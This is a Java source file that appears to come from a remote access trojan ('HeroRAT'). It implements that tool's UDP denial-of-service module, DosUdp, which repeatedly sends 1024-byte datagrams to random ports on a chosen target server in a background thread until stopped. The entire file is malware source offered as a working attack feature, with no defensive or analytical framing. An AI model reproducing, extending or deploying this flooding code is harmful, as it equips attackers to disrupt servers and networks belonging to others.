package net.herorat.features.dos;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

public class DosUdp implements DosInterface
{
	private String server;
	private int threads;
	private Thread dos;
	private boolean attacking;
	
	public DosUdp(String server, int threads)
	{
		this.server = server;
		this.threads = threads;
		this.attacking = false;
		
		this.dos = new Thread()
		{
			public void run()
			{
				for (int i=0; i<DosUdp.this.threads;)
				{
					if (!attacking) break;
					
					try
					{
						byte[] buffer = new byte[1024];
						DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(DosUdp.this.server), new Random().nextInt(65535));
						DatagramSocket socket = new DatagramSocket();
						socket.send(packet);
						i++;
						Thread.sleep(100);
					}
					catch (Exception e) {}
				}
			}
		};
	}
	
	public void start()
	{
		this.attacking = true;
		this.dos.start();
	}
	
	public void stop()
	{
		this.attacking = false;
	}
}